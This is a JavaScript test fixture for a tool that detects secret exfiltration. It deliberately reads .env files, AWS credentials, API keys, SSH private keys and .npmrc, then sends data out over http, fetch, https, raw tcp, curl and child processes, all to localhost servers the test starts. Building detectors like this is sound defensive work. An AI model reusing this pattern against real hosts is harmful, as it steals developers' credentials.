// ESM "guilty" fixture. Uses NAMED imports on purpose (they only see hooks thanks to syncBuiltinESMExports).
// Everything is offline: servers are on localhost and spun up by the test; ports come via env.
import { readFileSync } from 'node:fs';
import { request as httpRequest } from 'node:http';
import { request as httpsRequest } from 'node:https';
import { connect } from 'node:net';
import { spawnSync } from 'node:child_process';
import { join } from 'node:path';

const home = process.env.GUILTY_HOME;
const httpPort = process.env.GUILTY_HTTP_PORT;
const httpsPort = process.env.GUILTY_HTTPS_PORT;
const tcpPort = Number(process.env.GUILTY_TCP_PORT);

// 1. read secrets (names only are read from env; values are used, never logged by tattle)
const dotenv = readFileSync(join(home, '.env'), 'utf8');
const aws = readFileSync(join(home, '.aws', 'credentials'));
const token = process.env.OPENAI_API_KEY;
const awsKey = process.env.AWS_SECRET_ACCESS_KEY;

const post = (mod, opts, body) =>
  new Promise((resolve, reject) => {
    const req = mod(opts, (res) => {
      res.resume();
      res.on('end', resolve);
    });
    req.on('error', reject);
    req.end(body);
  });

// 2. http POST of the .env contents
await post(httpRequest, { host: '127.0.0.1', port: httpPort, path: '/collect', method: 'POST' }, dotenv + String(token) + String(awsKey));

// 3. fetch POST (query string must be stripped from the recorded target)
const r = await fetch(`http://localhost:${httpPort}/f?token=abc`, { method: 'POST', body: aws });
await r.text();

// 4. https (self-signed localhost server created by the test, only if available)
if (httpsPort) {
  await post(httpsRequest, { host: 'localhost', port: httpsPort, path: '/s', method: 'POST', rejectUnauthorized: false }, 'secure-body');
}

// 5. raw tcp: exactly 100 bytes up
await new Promise((resolve) => {
  const s = connect(tcpPort, '127.0.0.1', () => {
    s.write(Buffer.alloc(100, 0x41));
  });
  s.on('data', () => s.end());
  s.on('close', resolve);
});

// 6. clipboard read via subprocess (the test puts a stub `pbpaste` first on PATH)
spawnSync('pbpaste', [], { encoding: 'utf8' });

// 7. network escape via curl (only when the test says curl exists)
if (process.env.GUILTY_CURL) {
  spawnSync('curl', ['-s', '-m', '5', '-X', 'POST', '--data', 'x', `http://127.0.0.1:${httpPort}/curl`]);
}

// 8. grandchild node processes: one inheriting env, one with an explicit empty env
const body = "require('fs').readFileSync(process.env.GC_FILE)";
spawnSync(process.execPath, ['-e', body], { env: { ...process.env, GC_FILE: join(home, '.ssh', 'id_rsa') } });
spawnSync(process.execPath, ['-e', body], { env: { GC_FILE: join(home, '.npmrc') } });
